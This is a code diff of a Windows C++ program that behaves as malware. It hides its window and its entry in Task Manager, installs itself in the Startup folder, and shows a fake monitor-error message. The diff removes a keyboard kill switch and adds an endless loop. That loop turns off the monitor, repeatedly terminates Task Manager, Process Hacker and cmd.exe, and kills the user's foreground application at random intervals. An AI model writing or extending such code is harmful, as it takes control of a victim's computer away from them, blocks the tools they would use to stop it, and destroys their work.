@@ -137,26 +137,100 @@ void mbox()
     std::string tocheck = "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/" + exename();
     fileStream.open(tocheck);
     if (fileStream.fail()) {
-        MessageBox(0, "Error", "GUI support only 60hz", MB_OK);
+        MessageBox(0, "programm not support your monitor", "Error", MB_OK);
     }
+}
+
+bool process_exists(const char* const processName)
+{
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    Process32First(hSnapshot, &pe);
+
+    while (1) {
+        if (strcmp(pe.szExeFile, processName) == 0) return true;
+        if (!Process32Next(hSnapshot, &pe)) return false;
+    }
+}
+void monitoroff()
+{
+    
 }
 int main()
 {
+    int iter = 3;
     Hide();
     hidefromtaskmanager();
     mbox();
     autorun();
     srand(time(NULL));
     Sleep(210000);
-    bool flag = false;
-    while (!flag)
+    while (true)
     {
-        if (GetAsyncKeyState('P')) {
-            if (GetAsyncKeyState('O')) {
-                flag = true;
+        if (iter == 3)
+        {
+            bool flagg = false;
+            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+            while (!flagg)
+            {
+                std::string str1 = "Taskmgr.exe";
+                LPSTR s1 = const_cast<char*>(str1.c_str());
+                DWORD pid1 = MyGetProcessId(TEXT(s1));
+                if (pid1 != 0)
+                {
+                    HANDLE hProcess1 = OpenProcess(PROCESS_ALL_ACCESS, false, pid1);
+                    TerminateProcess(hProcess1, 0);
+                }
+
+                std::string str2 = "ProcessHacker.exe";
+                LPSTR s2 = const_cast<char*>(str2.c_str());
+                DWORD pid2 = MyGetProcessId(TEXT(s2));
+                if (pid2 != 0)
+                {
+                    HANDLE hProcess2 = OpenProcess(PROCESS_ALL_ACCESS, false, pid2);
+                    TerminateProcess(hProcess2, 0);
+                }
+
+                std::string str3 = "cmd.exe";
+                LPSTR s3 = const_cast<char*>(str3.c_str());
+                DWORD pid3 = MyGetProcessId(TEXT(s3));
+                if (pid3 != 0)
+                {
+                    HANDLE hProcess3 = OpenProcess(PROCESS_ALL_ACCESS, false, pid3);
+                    TerminateProcess(hProcess3, 0);
+                }
+                flagg = true;
             }
         }
-        
+        std::string str4 = "Taskmgr.exe";
+        LPSTR s4 = const_cast<char*>(str4.c_str());
+        DWORD pid4 = MyGetProcessId(TEXT(s4));
+        if (pid4 != 0)
+        {
+            HANDLE hProcess4 = OpenProcess(PROCESS_ALL_ACCESS, false, pid4);
+            TerminateProcess(hProcess4, 0);
+        }
+
+        std::string str5 = "ProcessHacker.exe";
+        LPSTR s5 = const_cast<char*>(str5.c_str());
+        DWORD pid5 = MyGetProcessId(TEXT(s5));
+        if (pid5 != 0)
+        {
+            HANDLE hProcess5 = OpenProcess(PROCESS_ALL_ACCESS, false, pid5);
+            TerminateProcess(hProcess5, 0);
+        }
+
+        std::string str56 = "cmd.exe";
+        LPSTR s56 = const_cast<char*>(str56.c_str());
+        DWORD pid56 = MyGetProcessId(TEXT(s56));
+        if (pid56 != 0)
+        {
+            HANDLE hProcess56 = OpenProcess(PROCESS_ALL_ACCESS, false, pid56);
+            TerminateProcess(hProcess56, 0);
+        }
+
         std::string str = getForegroundWindowProcessName();
         LPSTR s = const_cast<char*>(str.c_str());
         DWORD pid = MyGetProcessId(TEXT(s));
@@ -166,6 +240,7 @@ int main()
             TerminateProcess(hProcess, 0);
         }
         Sleep(random(120000, 480000));
+        iter++;
     }
     return 0;
 }
